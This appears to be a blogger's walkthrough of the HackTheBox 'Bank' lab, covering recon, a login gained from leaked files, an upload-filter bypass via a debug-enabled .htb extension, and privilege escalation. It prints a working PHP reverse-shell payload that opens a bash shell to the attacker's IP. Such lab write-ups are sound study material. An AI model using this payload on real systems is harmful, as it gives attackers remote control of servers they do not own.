+++
title = "HackTheBox - Bank"
description = ""
type = ["posts","post"]
tags = [
    "HackTheBox",
    "CTF",
    "Bug",
]
date = "2020-06-29"
categories = [
    "HackTheBox",
    "CTF",
]
series = ["HackTheBox"]
[ author ]
  name = "0xSc0ut"
+++
In the series of HackTheBox our next stop is ‘Bank’.

This is an Linux based machine which is tagged with ‘Easy’ severity, it was fun learning by playing with this box.But it needs lots of patience and information gathering skills to successfully exploit it.


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593499809806_Screenshot+2020-06-30+at+12.19.52+PM.png)


**Tools:**

* PortScan - Nmap and Masscan
* Proxy - Burp Suite
* Directory Search - [ffuf](https://github.com/ffuf/ffuf)
* Privilege Escalation - [LinuxPrivilegeChecker](https://github.com/sleventyeleven/linuxprivchecker)

**Steps To Reproduce:**

So without any delay i just started scanning all ports and sersion configuration using masscan and nmap

**Initial Recon:**


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593500049001_Screenshot+2020-06-30+at+12.23.59+PM.png)

![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593500103632_Screenshot+2020-06-30+at+12.24.53+PM.png)


On viewing the result port 22 appeared to be unusual after surfing i didn’t find anything intresting, meanwhile i ran fuff to search directories.

On accessing port 80, we can see that default apache page is available

![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501039346_Screenshot+2020-06-30+at+12.40.08+PM.png)


Dead end!!

After taking a look a forum disscussion, there was mentioned something about hostname, so with less hope i configured host name in /etc/hosts


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501195247_Screenshot+2020-06-30+at+12.43.02+PM.png)


 
I don’t know why this behaves like this, i got a web application with a login page 


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501270552_Screenshot+2020-06-30+at+12.43.32+PM.png)


**Directory Search:**

After long time of struggling with login page nothing came up, so i started running fuff with different files


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501526158_Screenshot+2020-06-30+at+12.47.29+PM.png)

![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501517590_Screenshot+2020-06-30+at+12.46.46+PM.png)


******Successful login:**

After lots of scanning i found something useful


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501578621_Screenshot+2020-06-30+at+11.20.45+AM.png)


While looking at those file contents, it had some information which were encrypted,


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501656815_Screenshot+2020-06-30+at+12.50.10+PM.png)


So i started scrolling down to find anything unusual, here we go 


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501700352_Screenshot+2020-06-30+at+11.22.59+AM.png)


One file appear to have different file size, on referring the file i get to know some information which lead me to login successfully


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593501778813_Screenshot+2020-06-30+at+11.23.35+AM.png)


Boom!! we are inside



![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593502015116_Screenshot+2020-06-30+at+12.54.29+PM.png)


**Command Execution:**

In support tab i found file upload functionality, using which i try to upload php file which was rejected.


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593502166604_Screenshot+2020-06-30+at+11.27.29+AM.png)


So this expects image file, right as traditional method i used [exiftool](https://github.com/xapax/security/blob/master/bypass_image_upload.md) to store my reverse shell content into image file

But by doing so my image got rendered and i didn’t get any shell.

During my initial recon i found some like this


     <!-- [DEBUG] I added the file extension .htb to execute as php for debugging purposes only [DEBUG] -->

So i try to upload my reverse shell by creating a file with .htb extension


    Reverse shell code:
    <?php
    exec("/bin/bash -c 'bash -i >& /dev/tcp/10.10.14.24/1234 0>&1'");
    ?>

Finally we are into the server


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593502665235_Screenshot+2020-06-30+at+11.39.03+AM.png)


**User Flag:**

I thought www-data won’t have permission to read user.txt but to my suprise it was readable


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593503586536_Screenshot+2020-06-30+at+11.40.17+AM.png)


**Privilege Escalaltion:**

So for escalating to root, basic information are required. Just transfer linuxprivilegechecker.py file to /tmp directory and run 

Based on results i found something interesting which is running as root privilege


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593503876094_Screenshot+2020-06-30+at+11.57.57+AM.png)


So executing this file got me root 


![](https://paper-attachments.dropbox.com/s_AD14E45FD131F93434088725A0CFC766E5C1F08AFF2D386BCFD68253BECECA94_1593503907340_Screenshot+2020-06-30+at+12.00.44+PM.png)


Thank you, Have a good day

